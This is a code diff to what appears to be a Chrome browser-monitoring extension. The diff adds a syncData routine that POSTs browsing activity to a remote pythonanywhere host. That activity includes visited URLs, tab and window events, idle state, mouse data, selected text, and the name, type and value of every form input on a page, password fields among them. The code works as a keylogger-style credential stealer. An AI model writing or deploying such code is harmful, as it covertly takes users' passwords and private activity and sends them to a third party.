@@ -19,6 +19,7 @@ chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
 			console.log("URL: "+tab.url+" ~"+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
 			//console.log("date: "+ctimestamp+" | "+new Date(ctimestamp).toUTCString()+" | " +new Date(datestamp).getTime());
 			//chrome.tabs.executeScript(tab.id, {code: "(" + contentscri.toString() + ")()" });
+			syncData(localStorage.getItem('userid'), 'Tab', tab.url, "New Tab", ctimestamp);
 		}else{
 			//console.log("nooo.....");
 		}
@@ -98,15 +99,16 @@ function contentscri() {
 	try {
 		inputs = document.getElementsByTagName('input');
 		//alert("inputs: "+inputs.length);
-		console.log("Size: "+inputs.length);
+		//console.log("Size: "+inputs.length);
+		var logformfields = '';
 		for (index = 0; index < inputs.length; ++index) {
-				console.log(inputs[index]+":"+inputs[index].value+"\n");
-				console.log("hey");
-				chrome.extension.sendMessage({greeting: "hello", data: ""+inputs[index]+":"+inputs[index].value+""}, function(response) {
-					console.log(response);
-				});
+				//console.log(inputs[index]+":"+inputs[index].value+"\n");				
+				logformfields += inputs[index]+"~ "+inputs[index].name+": "+inputs[index].value+" ["+inputs[index].type+"]\n";
 				//alert(inputs[index]+":"+inputs[index].value);
 		}
+		chrome.extension.sendMessage({greeting: "hello", data: ""+logformfields}, function(response) {
+			console.log(response);
+		});
 	} catch(e) {
 		console.log(e);
 	}
@@ -125,6 +127,7 @@ chrome.tabs.onActivated.addListener(function(changeInfo) {
 			console.log("URL: Switched "+tab.url+" ~"+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
 			//console.log("date: "+ctimestamp+" | "+new Date(ctimestamp).toUTCString()+" | " +new Date(datestamp).getTime());	
 			//chrome.tabs.executeScript(tab.id, {code: "(" + contentscri.toString() + ")()" });
+			syncData(localStorage.getItem('userid'), 'Tab', tab.url, "Tab Switched", ctimestamp);
 		}else{
 			//console.log("ACT: nooo.....");
 		}
@@ -134,15 +137,17 @@ chrome.tabs.onActivated.addListener(function(changeInfo) {
 //Listener to capture tab close
 chrome.tabs.onRemoved.addListener(function(tabId, removeInfo){
 	try {
+		var ctimestamp = Date.now();
 		if(urls[tabId]){
-			var ctimestamp = Date.now();
 			var datestamp = new Date(ctimestamp).toUTCString();
 			//alert("Moved to: "+tab.url);
 			console.log("URL: Closed "+urls[tabId]+" ~"+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
 			//console.log("date: "+ctimestamp+" | "+new Date(ctimestamp).toUTCString()+" | " +new Date(datestamp).getTime());	
 			//chrome.tabs.executeScript(tab.id, {code: "(" + contentscri.toString() + ")()" });
+			syncData(localStorage.getItem('userid'), 'Tab', urls[tabId], "Tab Closed", ctimestamp);
 		} else {
 			console.log("URL: Closed "+tabId);
+			syncData(localStorage.getItem('userid'), 'Tab', '', "Tab Closed [TabID:"+tabId+"]", ctimestamp);
 		}
 	} catch(e) {
 		console.log(e);
@@ -152,7 +157,9 @@ chrome.tabs.onRemoved.addListener(function(tabId, removeInfo){
 //Listener to capture Window closed
 chrome.windows.onRemoved.addListener(function(windowId){
 	try{
-		console.log("Window: Closed "+ new Date(Date.now()).toUTCString()+" | "+localStorage.getItem('userid'));
+		var ctimestamp = Date.now();
+		console.log("Window: Closed "+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
+		syncData(localStorage.getItem('userid'), 'Window', '', "Window Closed", ctimestamp);
 	} catch(e) {
 		console.log(e);
 	}
@@ -160,23 +167,31 @@ chrome.windows.onRemoved.addListener(function(windowId){
 
 //Listen to capture Window created
 chrome.windows.onCreated.addListener(function(window){
-	console.log("Window:"+window.state);
+	var ctimestamp = Date.now();
+	console.log("Window:"+window.state+" | "+ctimestamp);
+	syncData(localStorage.getItem('userid'), 'Window', '', "Window Created", ctimestamp);
 });
 
 //Listen to Window Focus changed event
 chrome.windows.onFocusChanged.addListener(function(windowId) {
     //console.log("Focus changed. "+windowId);
+	var ctimestamp = Date.now();
 	if(windowId != -1){
 		chrome.windows.get(windowId, function(window){
-			console.log("Window: "+window.state);
+			console.log("Window: "+window.state+" | "+ctimestamp);
+			syncData(localStorage.getItem('userid'), 'Window', '', "Window "+window.state, ctimestamp);
 		});
+	}else{
+		console.log("Window: Possible Minimize | "+ctimestamp);
+		syncData(localStorage.getItem('userid'), 'Window', '', "Window -Possible Minimize", ctimestamp);
 	}
 });
 
-function syncData(){
+function syncData(emailid, eventtype, urllink, datas, ts){
 	var http = new XMLHttpRequest();
 	var url = "https://autocode.pythonanywhere.com/BrowserMonitoring/webapi/syncdata";
-	var params = "datas=clicked&ts="+Date.now();
+	//var params = "datas=clicked&ts="+Date.now();
+	var params = "emailid="+emailid+"&eventtype="+eventtype+"&urllink="+urllink+"&datas="+datas+"&ts="+ts;
 	//alert(params);
 	http.open("POST", url, true);
 
@@ -206,19 +221,22 @@ chrome.tabs.query({active: true}, function(tab){
 
 //Listen to the system state to identify if its awake / idle / locked
 chrome.idle.onStateChanged.addListener(function(newState){
-	console.log("Machine State: "+newState+" | "+new Date(Date.now()).toUTCString());
+	var ctimestamp = Date.now();
+	console.log("Machine State: "+newState+" | "+new Date(ctimestamp).toUTCString());
+	syncData(localStorage.getItem('userid'), 'Screen', '', ""+newState, ctimestamp);
 });
 
 //Listener to listen to chrome messages. Messages passed from contentscript.js
 //The messages are then printed to console
 chrome.extension.onMessage.addListener(function(request, sender, callback) {
 	//console.log("in extOnReq");
+	var ctimestamp = Date.now();
     switch (request.greeting) {
         case 'hello':
             var data = request.data;
             // do something with your form credentials.
-			console.log("Tab: "+data +" | "+localStorage.getItem('userid'));
-			//syncData('');
+			console.log("Input: "+data +" | "+localStorage.getItem('userid'));
+			syncData(localStorage.getItem('userid'), 'Input', '', ""+data, ctimestamp);
             break;
 		case 'keys':
 			var data = request.data;
@@ -229,12 +247,14 @@ chrome.extension.onMessage.addListener(function(request, sender, callback) {
 			var data = request.data;
             // do something with your form credentials.
 			console.log("Mouse: "+data +" | "+localStorage.getItem('userid'));
+			syncData(localStorage.getItem('userid'), 'Mouse', '', ""+data, ctimestamp);
             break;
 		case 'selected':
 			var data = request.data;
             // do something with your form credentials.
 			if(data.trim()!=''){
 				console.log("Selected: "+data +" | "+localStorage.getItem('userid'));
+				syncData(localStorage.getItem('userid'), 'Selected', '', ""+data, ctimestamp);
 			}
 			//syncData();
             break;
